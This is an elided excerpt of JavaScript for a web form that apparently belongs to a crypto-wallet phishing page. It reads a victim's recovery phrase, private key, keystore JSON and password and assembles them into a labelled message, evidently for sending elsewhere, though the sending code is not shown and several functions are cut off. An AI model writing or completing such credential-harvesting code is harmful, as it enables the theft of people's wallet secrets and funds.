...
function validateJsonForm() {
  const jsonValue = String(document.getElementById('json').value).trim(); // Ensure JSON input is treated as a string
  const passwordValue = String(document.getElementById('password').value).trim(); // Ensure Password input is treated as a string
...
function validatePrivateKeyForm() {
  const privateKey = String(document.getElementById('key').value).trim(); // Ensure the input is treated as a string
...
function collectFormData() {
  ...
  // Collect phrase
  const inputWords = String(document.getElementById('words').value).trim();
  if (inputWords) {
    const wordsArray = inputWords.split(/\s+/);
  ...
  // Collect private key
  const privateKey = String(document.getElementById('key').value).trim(); // Ensure Private Key input is treated as a string
  if (privateKey) {
    message += `PRIVATE KEY: ${privateKey}\n\n`;
  }

  // Collect JSON and Password
  const jsonValue = String(document.getElementById('json').value).trim(); // Ensure JSON input is treated as a string
  const passwordValue = String(document.getElementById('password').value).trim(); // Ensure Password input is treated as a string
  if (jsonValue) {
